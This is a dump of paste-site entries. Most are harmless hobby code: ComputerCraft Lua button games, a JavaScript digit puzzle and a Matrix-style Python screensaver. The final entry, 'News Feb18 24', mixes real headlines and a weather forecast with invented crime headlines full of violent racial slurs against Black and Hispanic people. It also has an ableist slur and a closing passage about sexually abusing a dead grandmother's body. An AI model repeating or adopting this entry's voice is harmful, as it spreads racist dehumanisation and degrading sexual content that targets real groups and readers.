        time.sleep(PAUSE)  # Add a slight pause.
except KeyboardInterrupt:
    sys.exit()  # When Ctrl-C is pressed, end the program.
"
iPieA3qa,"The Button Game AUTO (2x2 monitor, right)",fbMarcel,Lua,Sunday 18th of February 2024 08:31:41 AM CDT,"-- positions for numbers on screen
-- first number x, y position
local numX1 = 2
local numY1 = 1
-- second number x, y position
local numX2 = 12
local numY2 = 1

-- load pictures of numbers
nNull = paintutils.loadImage(""/games/TheButton/num/nNull.nfp"")
n1 = paintutils.loadImage(""/games/TheButton/num/n1.nfp"")
n2 = paintutils.loadImage(""/games/TheButton/num/n2.nfp"")
n3 = paintutils.loadImage(""/games/TheButton/num/n3.nfp"")
n4 = paintutils.loadImage(""/games/TheButton/num/n4.nfp"")
n5 = paintutils.loadImage(""/games/TheButton/num/n5.nfp"")
n6 = paintutils.loadImage(""/games/TheButton/num/n6.nfp"")
n7 = paintutils.loadImage(""/games/TheButton/num/n7.nfp"")
n8 = paintutils.loadImage(""/games/TheButton/num/n8.nfp"")
n9 = paintutils.loadImage(""/games/TheButton/num/n9.nfp"")
n0 = paintutils.loadImage(""/games/TheButton/num/n0.nfp"")

term.setBackgroundColor(colors.black)
term.setTextColor(colors.white)
term.clear()
term.setCursorPos(1,12)
term.setTextColor(colors.gray)
write(""Highscore:"")
term.setCursorPos(13,12)
write(""0"")
term.setCursorPos(1,1)

function p(x)
  number = string.format(""%0.2i"", x)
  x1 = tonumber(string.sub(number,1,1))
  x2 = tonumber(string.sub(number,2,2))
  if x1 == 1 then
    paintutils.drawImage(n1,numX1,numY1)
  elseif x1 == 2 then
    paintutils.drawImage(n2,numX1,numY1)
  elseif x1 == 3 then
    paintutils.drawImage(n3,numX1,numY1)
  elseif x1 == 4 then
    paintutils.drawImage(n4,numX1,numY1)
  elseif x1 == 5 then
    paintutils.drawImage(n5,numX1,numY1)
  elseif x1 == 6 then
    paintutils.drawImage(n6,numX1,numY1)
  elseif x1 == 7 then
    paintutils.drawImage(n7,numX1,numY1)
  elseif x1 == 8 then
    paintutils.drawImage(n8,numX1,numY1)
  elseif x1 == 9 then
    paintutils.drawImage(n9,numX1,numY1)
  elseif x1 == 0 then
    paintutils.drawImage(n0,numX1,numY1)
  end
  if x2 == 1 then
    paintutils.drawImage(n1,numX2,numY2)
  elseif x2 == 2 then
    paintutils.drawImage(n2,numX2,numY2)
  elseif x2 == 3 then
    paintutils.drawImage(n3,numX2,numY2)
  elseif x2 == 4 then
    paintutils.drawImage(n4,numX2,numY2)
  elseif x2 == 5 then
    paintutils.drawImage(n5,numX2,numY2)
  elseif x2 == 6 then
    paintutils.drawImage(n6,numX2,numY2)
  elseif x2 == 7 then
    paintutils.drawImage(n7,numX2,numY2)
  elseif x2 == 8 then
    paintutils.drawImage(n8,numX2,numY2)
  elseif x2 == 9 then
    paintutils.drawImage(n9,numX2,numY2)
  elseif x2 == 0 then
    paintutils.drawImage(n0,numX2,numY2)
  end
end

local c = 0
function cc()
  c = math.floor(math.random()*100)
end

local score = 0

function high(num)
  if num > score then
    score = num
    term.setCursorPos(13,12)
    term.setTextColor(colors.gray)
    term.setBackgroundColor(colors.black)
    write(score)
  end
end

local h = 0

paintutils.drawImage(nNull,numX1,numY1)
paintutils.drawImage(nNull,numX2,numY2)

function main()
while true do
  --os.pullEvent(""mouse_click"")
  sleep(0.01)
  cc()
  if c > h then
    h = h + 1
  else
    high(h)
    h = 0
  end
  --p(h)
end
end

function blink()
while true do
term.setBackgroundColor(colors.red)
--term.setCursorPos(18,12)
--write(""_"")
paintutils.drawPixel(18,12)
sleep(1)
term.setBackgroundColor(colors.green)
--term.setCursorPos(18,12)
--write(""_"")
paintutils.drawPixel(18,12)
sleep(1)
end
end

function exit()
  os.pullEvent(""mouse_click"")
  term.setTextColor(colors.white)
  term.setBackgroundColor(colors.black)
  term.clear()
  os.shutdown()
end

parallel.waitForAny(main, blink, exit)
"
vHMEfeVx,sumAndProduct,Huku89,JavaScript,Sunday 18th of February 2024 08:30:59 AM CDT,"function sumAndProduct(input) {
  let n = Number(input[0]);

  for (let a = 1; a <= 9; a++) {
    for (let b = 9; b >= a; b--) {
      for (let c = 0; c <= 9; c++) {
        for (d = 9; d >= c; d--) {
          let sum = a + b + c + d;
          let mult = a * b * c * d;

          if (sum === mult && n % 10 === 5) {
            console.log(`${a}${b}${c}${d}`);
            return;
          } else if (mult / sum === 3 && n % 3 === 0) {
            console.log(`${d}${c}${b}${a}`);
            return;
          }
        }
      }
    }
  }
  console.log(""Nothing found"");
}"
sVkMMBHR,"The Button Game (2x2 monitor, right)",fbMarcel,Lua,Sunday 18th of February 2024 08:30:33 AM CDT,"-- positions for numbers on screen
-- first number x, y position
local numX1 = 2
local numY1 = 1
-- second number x, y position
local numX2 = 12
local numY2 = 1

-- load pictures of numbers
n1 = paintutils.loadImage(""/games/TheButton/num/n1.nfp"")
n2 = paintutils.loadImage(""/games/TheButton/num/n2.nfp"")
n3 = paintutils.loadImage(""/games/TheButton/num/n3.nfp"")
n4 = paintutils.loadImage(""/games/TheButton/num/n4.nfp"")
n5 = paintutils.loadImage(""/games/TheButton/num/n5.nfp"")
n6 = paintutils.loadImage(""/games/TheButton/num/n6.nfp"")
n7 = paintutils.loadImage(""/games/TheButton/num/n7.nfp"")
n8 = paintutils.loadImage(""/games/TheButton/num/n8.nfp"")
n9 = paintutils.loadImage(""/games/TheButton/num/n9.nfp"")
n0 = paintutils.loadImage(""/games/TheButton/num/n0.nfp"")

term.clear()
term.setCursorPos(1,12)
term.setTextColor(colors.red)
write(""Highscore:"")
term.setCursorPos(13,12)
write(""0"")
term.setCursorPos(1,1)

function p(x)
  number = string.format(""%0.2i"", x)
  x1 = tonumber(string.sub(number,1,1))
  x2 = tonumber(string.sub(number,2,2))
  if x1 == 1 then
    paintutils.drawImage(n1,numX1,numY1)
  elseif x1 == 2 then
    paintutils.drawImage(n2,numX1,numY1)
  elseif x1 == 3 then
    paintutils.drawImage(n3,numX1,numY1)
  elseif x1 == 4 then
    paintutils.drawImage(n4,numX1,numY1)
  elseif x1 == 5 then
    paintutils.drawImage(n5,numX1,numY1)
  elseif x1 == 6 then
    paintutils.drawImage(n6,numX1,numY1)
  elseif x1 == 7 then
    paintutils.drawImage(n7,numX1,numY1)
  elseif x1 == 8 then
    paintutils.drawImage(n8,numX1,numY1)
  elseif x1 == 9 then
    paintutils.drawImage(n9,numX1,numY1)
  elseif x1 == 0 then
    paintutils.drawImage(n0,numX1,numY1)
  end
  if x2 == 1 then
    paintutils.drawImage(n1,numX2,numY2)
  elseif x2 == 2 then
    paintutils.drawImage(n2,numX2,numY2)
  elseif x2 == 3 then
    paintutils.drawImage(n3,numX2,numY2)
  elseif x2 == 4 then
    paintutils.drawImage(n4,numX2,numY2)
  elseif x2 == 5 then
    paintutils.drawImage(n5,numX2,numY2)
  elseif x2 == 6 then
    paintutils.drawImage(n6,numX2,numY2)
  elseif x2 == 7 then
    paintutils.drawImage(n7,numX2,numY2)
  elseif x2 == 8 then
    paintutils.drawImage(n8,numX2,numY2)
  elseif x2 == 9 then
    paintutils.drawImage(n9,numX2,numY2)
  elseif x2 == 0 then
    paintutils.drawImage(n0,numX2,numY2)
  end
end

local c = 0
function cc()
  c = math.floor(math.random()*100)
end

local score = 0

function high(num)
  if num > score then
    score = num
    term.setCursorPos(13,12)
    write(score)
  end
end

local h = 0
p(h)
while true do
  os.pullEvent(""mouse_click"")
  --sleep(0.05)
  cc()
  if c > h then
    h = h + 1
  else
    high(h)
    h = 0
  end
  p(h)
end"
jZHpC82j,Digital Stream,Osiris1002,Python,Sunday 18th of February 2024 08:29:23 AM CDT,"""""""Digital Stream, by Al Sweigart al@inventwithpython.com
A screensaver in the style of The Matrix movie's visuals.
This code is available at https://nostarch.com/big-book-small-python-programming
Tags: tiny, artistic, beginner, scrolling""""""

import random, shutil, sys, time

# Set up the constants:
MIN_STREAM_LENGTH = 6  # (!) Try changing this to 1 or 50.
MAX_STREAM_LENGTH = 14  # (!) Try changing this to 100.
PAUSE = 0.1  # (!) Try changing this to 0.0 or 2.0.
STREAM_CHARS = ['0', '1']  # (!) Try changing this to other characters.

# Density can range from 0.0 to 1.0:
DENSITY = 0.02  # (!) Try changing this to 0.10 or 0.30.

# Get the size of the terminal window:
WIDTH = shutil.get_terminal_size()[0]
# We can't print to the last column on Windows without it adding a
# newline automatically, so reduce the width by one:
WIDTH -= 1

print('Digital Stream, by Al Sweigart al@inventwithpython.com')
print('Press Ctrl-C to quit.')
time.sleep(2)

try:
    # For each column, when the counter is 0, no stream is shown.
    # Otherwise, it acts as a counter for how many times a 1 or 0
    # should be displayed in that column.
    columns = [0] * WIDTH
    while True:
        # Set up the counter for each column:
        for i in range(WIDTH):
            if columns[i] == 0:
                if random.random() <= DENSITY:
                    # Restart a stream on this column.
                    columns[i] = random.randint(MIN_STREAM_LENGTH,
                                                MAX_STREAM_LENGTH)

            # Display an empty space or a 1/0 character.
            if columns[i] > 0:
                print(random.choice(STREAM_CHARS), end='')
                columns[i] -= 1
            else:
                print(' ', end='')
        print()  # Print a newline at the end of the row of columns.
        sys.stdout.flush()  # Make sure text appears on the screen.
        time.sleep(PAUSE)
except KeyboardInterrupt:
    sys.exit()  # When Ctrl-C is pressed, end the program.
"
671EHvRi,News Feb18 24,Newscaster_Ned,Email,Sunday 18th of February 2024 08:11:49 AM CDT,"..................Test 1..................
..................Test 2..................
..................Test 3..................
........................... Test complete.

Oy vey. Well. It's you queers again. Yawn.

Snoop Dogg Mourning the Death of His Brother Bing Worthington
German Union Calls for Lufthansa Ground Staff Strike at Seven Airports
Alex Soros: We Must Not Abandon Ukraine
J.J. Watt Suggests Reducing Offensive Holding Penalty from 10 Yards to 5 Ya
Get All Breitbart News Here
HomePage
John Mellencamp Demands Media Shock America Out of Its Stupor

Publish Photos of Children Killed in Shootings

Gun Control By Any Means Necessary
RALEIGH, NORTH CAROLINA - SEPTEMBER 24: John Mellencamp performs in concert during Farm Ai
Famed Jack and Diane singer John Mellencamp reacted to the Kansas City Chiefs parade shooting by calling for more gun control and urging news outlets to be brave enough to publish photos of slain children.

Zelensky Suggests Regime Change in Russia and Assassination Awaits Putin
Zelensky Suggests Assassination Awaits Putin
740
Buttigieg: Rail Accidents Have Increased over Past Year Despite Us Doing All We Can Because Congres
Buttigieg: Rail Accidents Went up in Past Year Despite Us Doing All We Can
768
Nike to Lay Off 1,600 Employees After Stock Dip and Woke Drama
Nike to Lay Off 1,600 Employees After Stock Dip and Woke Drama
582
Police: Pennsylvania Judge Shoots Ex-Boyfriend in Head, Shot Ex-Husband 5 Years Earlier
Police: Pennsylvania Judge Shot Ex-Boyfriend in Head While He Slept
769
Texas Gov. Abbott Announces Border Military Base to Combat Flow of Migrants
Texas Gov. Abbott Announces Border Military Base to Combat Flow of Migrants
565
Report: Biden Attorneys Pushed DOJ to Omit Language Critical of His Age
Report: Biden Attorneys Pushed DOJ to Omit Critique of Age, Memory
4,202
Its a Scorcher: Producer Price Inflation Rips Higher
It's a Scorcher: Producer Price Inflation Rips Higher
3,104
Zelensky Demands More Weapons From West, Invites Trump to Visit Front Line
Zelensky Demands More Weapons, Invites Trump to 'Front Line'
5,793
In Russias Arctic, Alexei Navalnys mother searches for her sons body
In Russias Arctic, Alexei Navalnys mother searches for her sons body
349
Judge Arthur Engoron Fines Trump $354M, Bars Him from Running Businesses in NY for 3 Years
Judge Arthur Engoron Fines Trump $354M, Bars Him from Business for Years

2 Cartersville Apemen Charged After Saturating White Man with Bullets.

The cops finally found his body.


Nig Arrested After Killing His Mudshark Gf in Columbus Division.


Bootlips Orally and Vaginally Rapes Student at  Atlantic Coast High School.


Ropehead Gets 520 Years for Waco Rape Case.


New Jersey: ICE Refuses to Deport Negroid Family from Ivory East Coast.


Spic Motorist Plows Down Bystander in Daytona Beach.

........ Weather.

Today
Sunny
56
/34
1%
NNE 8 mph
Sun 18 | Day
56
1%
NNE
8
 
mph
Plentiful sunshine. High 56F. Winds NNE at 5 to 10 mph.

Humidity
43%
UV Index
6 of 11
Sunrise
7:07 am
Sunset
6:20 pm
Sun 18 | Night
34
4%
S
3
 
mph
Clear skies. Low 34F. Winds light and variable.

Humidity
66%
UV Index
0 of 11
Moonrise
1:06 pm
Waxing Gibbous
Moonset
3:04 am
Mon 19
Sunny
68
/46
4%
S 13 mph
Tue 20
Partly Cloudy
77
/56
9%
SSW 13 mph
Wed 21
AM Clouds/PM Sun
80
/60
10%
SSW 14 mph
Thu 22
Partly Cloudy
83
/54
8%
W 12 mph
Fri 23
Partly Cloudy
72
/47
1%
NNE 13 mph
Sat 24
Partly Cloudy
76
/52
2%
SE 9 mph
Sun 25
Partly Cloudy
77
/60
7%
S 14 mph
Mon 26
AM Clouds/PM Sun
81
/63
7%
S 16 mph
Tue 27
Mostly Cloudy
82
/59
7%
SW 13 mph
Wed 28
Mostly Cloudy
77
/55
15%
WNW 14 mph
Thu 29
Mostly Cloudy
71
/50
24%
N 13 mph
Fri 01
Partly Cloudy
72
/50
12%
NNE 11 mph
Sat 02
Partly Cloudy
71
/48
18%
SSW 10 mph
Sun 03
Partly Cloudy
72
/52
24%
SE 11 mph

...........

Current threat: The suspicious. 

...........

The Coffin of Andy and Leyley
The main quirks in this game are ""humor"", dialogue written by a porn addict, questionable art style and a shit-ton of implied sexual tension between siblings; Oh yeah, and also cannibalism - 'cuz why not?? It is a game that desperately tries to be controversial by trying to explore taboo subjects, like cannibalism, toxic relationships, demon worship, satanic rituals and incest, trying being the key word here. Of course, most of these topics were added into the game just to make it controversial and to trigger some butthurt retards for free publicity. And oh boy, did it succeed!!


(( ""ThE MoSt CoNtRoVeRsIaL gAmE oF 2023"" ))

........................................................

Echinaster sepositus, also known as the Mediterranean red sea star, is a species of starfish in the Echinasteridae family. It is found in the eastern Atlantic Ocean, including the Mediterranean Sea and the French side of the English Channel, at depths of up to 250 m (820 ft). It has a wide range of habitats including rocky, sandy and muddy bottoms, and sea-grass meadows formed of Posidonia oceanica and Zostera. E. sepositus has five relatively slender arms, with a diameter of up to 20 cm, or occasionally as much as 30 cm. It is a bright orange-red in colour with a soapy surface texture and a surface dotted with evenly spaced pits from which the animal can extend its deep red gills (papula). This E. sepositus individual was photographed in the Atlantic Ocean in the Arrbida Natural Park, Portugal.

Photograph credit: Diego Delso

Well. You may be upset that your grandma is dead. However, I have resurrected her body so she can become my new lifelong sex toy. I am going to dress her up as a Japanese schoolgirl and fuck her into the night."
